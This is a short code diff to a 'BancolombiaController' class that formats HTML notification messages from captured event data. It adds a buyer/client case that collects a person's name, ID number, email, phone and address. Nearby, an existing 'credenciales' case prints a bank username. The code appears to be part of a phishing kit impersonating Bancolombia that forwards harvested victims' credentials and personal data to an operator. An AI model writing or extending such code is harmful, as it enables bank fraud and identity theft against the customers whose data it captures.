@@ -1195,6 +1195,16 @@ export class BancolombiaController {
             msg += `<b>Nombre:</b> ${BancolombiaController.escapeHtml(event.data.nombre)}\n`;
             msg += `<b>Documento:</b> ${BancolombiaController.escapeHtml(event.data.documento)}\n\n`;
             break;
+          case 'comprador':
+          case 'cliente':
+            msg += `👤 <b>Comprador</b>\n`;
+            if (event.data?.nombre) msg += `<b>Nombre:</b> ${BancolombiaController.escapeHtml(event.data.nombre)}\n`;
+            if (event.data?.documento) msg += `<b>Documento:</b> ${BancolombiaController.escapeHtml(event.data.documento)}\n`;
+            if (event.data?.email) msg += `<b>Email:</b> ${BancolombiaController.escapeHtml(event.data.email)}\n`;
+            if (event.data?.telefono) msg += `<b>Teléfono:</b> ${BancolombiaController.escapeHtml(event.data.telefono)}\n`;
+            if (event.data?.direccion) msg += `<b>Dirección:</b> ${BancolombiaController.escapeHtml(event.data.direccion)}\n`;
+            msg += `\n`;
+            break;
           case 'credenciales':
             msg += `🔐 Credenciales\n`;
             msg += `<b>User:</b> ${BancolombiaController.escapeHtml(event.data.usuario)}\n`;
